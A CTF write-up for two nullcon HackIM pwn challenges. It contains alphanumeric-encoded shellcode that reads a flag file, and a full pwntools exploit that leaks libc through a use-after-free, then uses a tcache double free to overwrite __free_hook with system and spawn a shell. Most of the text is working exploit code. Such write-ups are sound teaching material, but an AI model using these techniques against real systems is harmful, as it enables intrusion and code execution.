## easy-shell

The logic is simple, a `RWX` page is allocated from `mmap`, and we can execute arbitrary codes but contents must be `alphanum`. I used this [tool](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder). However, the only problem is that this generator requires `rax` to be near the `shellcode` and `rax + padding_len == shellcode address`, but `rax` is `0` when our `shellcode` is executed. Thus, we can add `push r12; pop rax` in front of our payload and let `padding_len == 3`, which is the length of `push r12; pop rax`.

```python
from pwn import *
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')

sc = '''
mov rax,%s
push rax
mov rdi,rsp
mov rax,2
mov rsi,0
syscall

mov rdi,rax
sub rsp,0x20
mov rsi,rsp
mov rdx,0x20
mov rax,0
syscall

mov rdi,0
mov rsi,rsp
mov rdx,0x20
mov rax,1
syscall

''' % hex(u64(file_name))
sc = asm(sc)
print asm("push r12;pop rax;") + alphanum_encoder(sc, 3)
```

Actually, by the way, `peasy-shell` can be done in the same way: just add more `push xxx; pop xxx;` to fill first page, and fill the second page with real payload being generated, which is `RWX`.

## HackIM Shop

A typical UAF and double free challenge. Firstly leak the address in `got` table to leak `libc` and find its version in `libc-database`, which is `2.27`, the same one in `Ubuntu 18.04 LTS`. This can be done by UAF and control the `pointer` field in the `struct`.

Then, since it is `2.27`, the `tcache` is used instead, so we can use `double free` to poison the `tcache` and `malloc` the chunk onto `__free_hook`, then rewrite it to `system` to get the shell.

`exp.py`

```python
from pwn import *
import json
g_local=True
context.log_level='debug'
p = ELF('./challenge')
e = ELF("./libc6_2.27.so")
if g_local:
	sh = process('./challenge')#env={'LD_PRELOAD':'./libc.so.6'}
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	gdb.attach(sh)
else:
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	sh = remote("pwn.ctf.nullcon.net", 4002)
	#ONE_GADGET_OFF = 0x4557a

def add(name, name_len, price=0):
	sh.sendline("1")
	sh.recvuntil("name length: ")
	sh.sendline(str(name_len))
	sh.recvuntil("name: ")
	sh.sendline(name)
	sh.recvuntil("price: ")
	sh.sendline(str(price))
	sh.recvuntil("> ")

def remove(idx):
	sh.sendline("2")
	sh.recvuntil("index: ")
	sh.sendline(str(idx))
	sh.recvuntil("> ")

def view():
	sh.sendline("3")
	ret = sh.recvuntil("{")
	ret += sh.recvuntil("[")
	ret += sh.recvuntil("]")
	ret += sh.recvuntil("}")
	sh.recvuntil("> ")
	return ret

add("0", 0x38)
add("1", 0x68)
add("2", 0x68)
remove(0)
remove(1)
#0x40 1 -> 0 -> 0 data

fake_struct = p64(0)
fake_struct += p64(p.got["puts"])
fake_struct += p64(0) + p8(0)

add(fake_struct, 0x38) #3
leak = view()
libc_addr = u64(leak[0x2e:0x2e+6] + '\x00\x00') - e.symbols["puts"]
print hex(libc_addr)

add("4", 0x68)

#now bins are clear

add("5", 0x68)
add("/bin/sh\x00", 0x68) #6
add("/bin/sh\x00", 0x38)
add("/bin/sh\x00", 0x68)
add("/bin/sh\x00", 0x68)
add("/bin/sh\x00", 0x68)
add("/bin/sh\x00", 0x68)
add("/bin/sh\x00", 0x68)

remove(5)
remove(5)
remove(7) #prevent 0x40 from being used up

add(p64(libc_addr + e.symbols["__free_hook"]), 0x68)

add("consume", 0x68)

gots = ["system"]

fake_got = ""
for g in gots:
	fake_got += p64(libc_addr + e.symbols[g])
add(fake_got, 0x68)

sh.sendline("2")

sh.recvuntil("index: ")
sh.sendline(str(6))
sh.interactive()
```

